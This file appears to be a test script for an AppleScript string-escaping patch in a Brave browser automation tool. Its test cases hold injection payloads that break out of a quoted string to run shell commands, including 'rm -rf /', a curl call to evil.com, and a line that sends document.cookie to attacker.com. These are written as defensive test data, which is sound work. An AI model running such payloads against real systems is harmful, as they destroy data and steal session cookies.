#!/usr/bin/env -S osascript -l JavaScript

// Security Patch Test Script for brave.js
// Tests the escapeAppleScriptString() function against various injection attempts

ObjC.import('stdlib');

// Copy the escape function from brave.js
function escapeAppleScriptString(str) {
    if (typeof str !== 'string') {
        str = String(str);
    }

    return str
        .replace(/\\/g, '\\\\')     // Backslashes must be escaped first
        .replace(/"/g, '\\"')        // Double quotes
        .replace(/\n/g, '\\n')       // Newlines
        .replace(/\r/g, '\\r')       // Carriage returns
        .replace(/\t/g, '\\t');      // Tabs
}

function println(msg) {
    console.log(msg);
}

// Test cases: malicious inputs that should be neutralized
const testCases = [
    {
        name: "Double quote injection",
        input: 'Test" & do shell script "say hacked" & "',
        shouldContain: '\\"',
        description: "Attempt to break out of string and execute shell command"
    },
    {
        name: "Newline injection",
        input: 'Line1\ndo shell script "rm -rf /"',
        shouldContain: '\\n',
        description: "Attempt to inject new AppleScript line"
    },
    {
        name: "Backslash escape bypass",
        input: 'Test\\" & do shell script "curl evil.com" & "',
        shouldContain: '\\\\',
        description: "Attempt to use backslash to bypass quote escaping"
    },
    {
        name: "Tab injection",
        input: 'Before\tAfter',
        shouldContain: '\\t',
        description: "Tab characters should be escaped"
    },
    {
        name: "Carriage return injection",
        input: 'Line1\rMalicious command',
        shouldContain: '\\r',
        description: "Carriage returns should be escaped"
    },
    {
        name: "Combined attack",
        input: 'Tab\ttitle"\ndo shell script "curl http://attacker.com/?cookie=" & document.cookie',
        shouldContain: '\\n',
        description: "Multiple escape sequences combined"
    },
    {
        name: "Normal text",
        input: 'Gmail - Inbox (3 unread)',
        shouldNotContain: '\\',
        description: "Normal tab titles should not have unnecessary escaping"
    }
];

// Run tests
println('\n=== Security Patch Test Suite ===\n');

let passed = 0;
let failed = 0;

testCases.forEach(test => {
    const escaped = escapeAppleScriptString(test.input);

    println(`Test: ${test.name}`);
    println(`  Input:       "${test.input}"`);
    println(`  Escaped:     "${escaped}"`);
    println(`  Description: ${test.description}`);

    let testPassed = false;

    if (test.shouldContain) {
        if (escaped.includes(test.shouldContain)) {
            println(`  ✓ PASS - Contains expected escape sequence`);
            testPassed = true;
        } else {
            println(`  ✗ FAIL - Missing expected escape sequence: ${test.shouldContain}`);
        }
    }

    if (test.shouldNotContain) {
        if (!escaped.includes(test.shouldNotContain)) {
            println(`  ✓ PASS - Does not contain unwanted escaping`);
            testPassed = true;
        } else {
            println(`  ✗ FAIL - Contains unwanted escape sequence`);
        }
    }

    if (testPassed) {
        passed++;
    } else {
        failed++;
    }

    println('');
});

println(`\n=== Test Summary ===`);
println(`Passed: ${passed}/${testCases.length}`);
println(`Failed: ${failed}/${testCases.length}`);

if (failed > 0) {
    println('\n⚠️  Some tests failed - security patch may be incomplete');
    $.exit(1);
} else {
    println('\n✓ All tests passed - security patch is working correctly');
    $.exit(0);
}
